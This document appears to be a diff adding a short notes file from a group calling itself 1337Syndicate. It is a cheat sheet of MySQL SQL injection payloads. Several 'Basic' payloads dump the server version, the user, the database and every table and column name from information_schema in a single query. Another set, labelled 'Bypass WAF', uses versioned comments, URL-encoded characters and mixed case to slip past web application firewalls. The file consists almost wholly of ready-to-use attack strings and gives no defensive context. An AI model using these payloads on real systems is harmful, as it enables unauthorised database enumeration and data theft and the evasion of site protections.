@@ -1,0 +1,38 @@
+Catatan XylaufyyyId
+
+1337Syndicate
+"IT Security Development Research"
+https://1337syndicate.github.io/
+
+SQL Injection Payload
+
+Basic Payload
+concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)
+
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!=’information_schema’ and(@a)in (@a:=concat(@a,table_schema,’ > ‘,table_name,’ > ‘,column_name,'<br>’))))a)
+
+(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(select (@a) from (information_schema.columns)
+where (table_schema!=’information_schema’) and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,’ :: ‘,@tbl:=table_name,’
+‘,column_name), (column_name))))))a)
+
+(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.schemata) where (0x00) in (@x:=concat(@x,0x3c62723e,schema_name))))x)
+
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+Bypass WAF Payload
+concat (0x3c623e44756d7020696e204f6e652053686f743c2f623e,0x3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),@c:=0x00,if((select count(*) from /*!50000information_schema*/.columns /*!50000where*/ table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat (@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)
+
+(/*!12345%73elect*/(@a)/*!12345%66rom*/(/*!12345%73elect*/(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(/*!12345%73elect*/(@a)/*!12345%66rom*/(/*!12345`%69nformation_%73chema`.`%63olumns`*/)%77here (`%74able_schema`!=/*!12345’%69nformation_schema’*/)and(0x00)in(@a:=%63oncat%0a(@a,0x3c62723e,if( (@tbl!=/*!12345`table_name`*/), %43oncat%0a(0x3c62723e,@num:=(@num%2b1),0x2920,@tbl_sc:=`table_schema`,0x203a3a20,@tbl:=`%74able_name`,0x2028526f777320,(/*!12345%73elect*/`table_rows`from/*!12345`%69nformation_schema`.`tables`*/where table_schema=@tbl_sc and/*!12345`%74able_name`*/=@tbl),0x293c62723e,/*!12345`%63olumn_name`*/), (/*!12345`%63olumn_name`*/))))))a)
+
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+
+
+
+
+
+"IT Security Development Research"
+https://1337syndicate.github.io/
